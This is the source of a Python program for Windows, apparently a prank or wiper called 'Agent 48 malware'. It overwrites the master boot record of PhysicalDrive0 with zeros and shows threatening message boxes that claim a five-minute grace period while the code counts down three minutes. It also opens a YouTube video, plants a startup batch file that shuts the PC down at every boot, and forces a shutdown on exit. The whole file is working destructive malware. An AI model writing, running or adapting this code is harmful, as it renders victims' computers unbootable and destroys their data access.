import atexit
import os
import webbrowser
from time import sleep
from win32ui import *
from win32con import *
from win32file import *

# Program closing function
def my_exit_function(arg):

    # Turn off PC
    os.system("shutdown /s /t 1")

if __name__ == '__main__':

    atexit.register(my_exit_function, 'some argument', )

    # Initiliazing timer
    timer = 3
    timer *= 60

    # Overwriting MBR
    drive = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)

    WriteFile(drive, AllocateReadBuffer(512), None)
    CloseHandle(drive)

    # Warning message
    MessageBox("Hello, I'm sorry to announce that your computer\n"
               "got infected by the Agent 48 malware.\n"
               "Someone probably didn't like you, and sent me over\n"
               "to destroy your computer.\n"
               "But since I'm very kind, I'll give you 5 minutes to\n"
               "save all of your files wherever you want.\n"
               "After that, your computer will turn off and you'll not\n"
               "be able to use it again.",
               "Agent 48",
               MB_ICONWARNING)

    MessageBox("If you turn off your computer and/or kill this task\n"
               "you will not have time to save your files, and your PC\n"
               "will turn off and you'll not be able to use it again.",
               "Warning",
               MB_ICONWARNING)

    # Opening song window
    webbrowser.open("https://www.youtube.com/watch?v=A3yCcXgbKrE")

    # Add batch file to Start-up
    user = os.getlogin()


    def add_to_startup(file_path=""):

        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))

        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % user

        # Create batch file for shutting down the PC every time it turns on
        with open(bat_path + '\\' + "Agent48.bat", "w+") as bat_file:
            bat_file.write('shutdown /s')


    add_to_startup()

    # Timer
    for i in range(timer):
        timer -= 1

        sleep(1)
